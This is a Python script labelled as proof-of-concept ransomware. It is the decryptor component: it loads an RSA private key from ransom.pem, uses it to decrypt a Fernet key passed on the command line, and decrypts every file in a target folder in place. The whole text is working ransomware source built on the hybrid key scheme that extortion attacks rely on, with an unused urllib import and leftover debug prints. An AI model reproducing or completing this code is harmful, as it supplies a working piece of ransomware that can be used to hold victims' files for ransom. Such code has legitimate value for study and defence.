# This is a proof of concept ransomware and is not to be used for malicious purposes
# This ransomware assumes the target has python3 with the cryptography library installed

import sys
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import serialization
import glob
import urllib.request
import urllib.parse

# Make a list of targets
targets = glob.glob("/home/admin/target/*")
print("Decrypting:")
print(targets)

print(type("/home/admin/target/test1"))

# Input encrypted key file on command line
encrypted_key = sys.argv[1]



# Read Private Key
def read_private (filename = "ransom.pem"):
	with open(filename, "rb") as key_file:
		private_key = serialization.load_pem_private_key(
			key_file.read(),
			password=None,
			backend=default_backend()
		)
	return private_key

private_key = read_private()

#with open('smem.enc', "rb") as Sym

# Open and read encrypted Symmetric Key
file = open(encrypted_key, "rb")
smemENC = file.read()


# Decrypt symmetric Key
smem = private_key.decrypt(
	smemENC,
	padding.OAEP(
		mgf=padding.MGF1(algorithm=hashes.SHA256()),
		algorithm=hashes.SHA256(),
		label=None
	)
)

# Initialize key
#smemb = str.encode(smem)
skey = Fernet(smem)
print(type(skey))

# Decrypt files
for file in targets:
	with open(file, "rb") as target:
		encrypted_data = target.read()
	decrypted_data = skey.decrypt(encrypted_data)
	with open(file, "wb") as target:
		target.write(decrypted_data)


